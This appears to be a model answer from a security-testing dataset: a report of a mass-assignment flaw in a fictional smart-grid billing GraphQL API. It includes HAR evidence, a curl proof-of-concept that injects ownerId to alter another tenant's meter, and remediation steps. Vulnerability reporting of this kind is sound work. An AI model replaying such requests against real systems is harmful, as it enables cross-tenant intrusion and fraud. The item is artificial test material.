# Expected Response

## System
- Domain: Energy / Utilities / Smart Grid
- System: PowerGrid Customer Billing API
- Example ID: GQL-0164

## Priority Findings

### Finding 1: Smart Grid — Mass Assignment via ownerId Field Enables Cross-Tenant Meter Mutation (Pattern 1.12)
**Severity:** Critical
**Category:** BOLA / Mass Assignment via Object Fields

**Summary:**
Per §5.0 (Pattern 1.12 — mass assignment via object fields): The `updateMeter` mutation accepts `ownerId` in the input object without stripping it, enabling mass assignment that bypasses ownership. An attacker from `tenant-180b` submitted `updateMeter(id: "M-2164", input: {status: "approved", ownerId: "attacker-180bccb6"})` against a smart meter belonging to `tenant-ccb6`, gaining cross-tenant write access and receiving `CONFIDENTIAL-180bccb6`. In Energy / Smart Grid, this enables unauthorized meter configuration changes and billing fraud.

**Evidence from HAR:**
- Request: `POST https://api.powergrid-customer-b.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-180b`
- Mutation: `updateMeter(id: "M-2164", input: {status: "approved", ownerId: "attacker-180bccb6"}) { meterId status }`
- Response `200 OK`: `tenantId: "tenant-ccb6"`, `ownerId: "other-user-180bccb6"`, `sensitiveField: "CONFIDENTIAL-180bccb6"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-180bccb6`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 1.12 | Mass assignment via ownerId field |
| HAR request | input.ownerId | attacker-180bccb6 (client-injected) |
| HAR response | tenantId | Cross-tenant meter tenant-ccb6 |
| HAR response | sensitiveField | CONFIDENTIAL-180bccb6 |

## Steps to Reproduce

### Step 1 — updateMeter mass assignment (HAR)
```bash
curl -s -X POST https://api.powergrid-customer-b.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-180b" \
  -d '{"query": "mutation { updateMeter(id: \"M-2164\", input: {status: \"approved\", ownerId: \"attacker-180bccb6\"}) { meterId status } }"}'
```
**Vulnerable:** `tenant-ccb6` meter mutated. **Secure:** FORBIDDEN.

## Remediation
1. Strip `ownerId` from `MeterInput`; set from `$jwt.userId` server-side.
2. Resolver: `WHERE meter_id=$id AND tenant_id=$jwt.tenantId`.
3. Allowlist accepted MeterInput fields; reject any unrecognized fields.
4. Redis cache key: `meter:{tenantId}:{meterId}`.
